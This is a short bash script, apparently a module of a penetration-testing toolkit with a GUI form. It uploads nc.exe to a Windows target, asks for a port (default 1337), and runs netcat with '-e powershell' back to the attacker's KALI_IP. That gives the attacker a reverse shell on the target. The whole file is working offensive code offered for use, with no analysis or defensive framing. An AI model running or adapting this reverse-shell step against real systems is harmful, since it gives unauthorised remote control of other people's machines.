#!/bin/bash

: '
upload nc.exe and start nc.exe and execute powershell
'

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="nc.exe"
EXECUTE_COMMAND="powershell"

cmd_upload_file "${LOCATION}" "${FILE}"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${PORT_FIELD}"

PORT=${form_data["port"]}

execute_command "${FILE_LOCATION} ${KALI_IP} ${PORT} -e ${EXECUTE_COMMAND}"
create_new_line
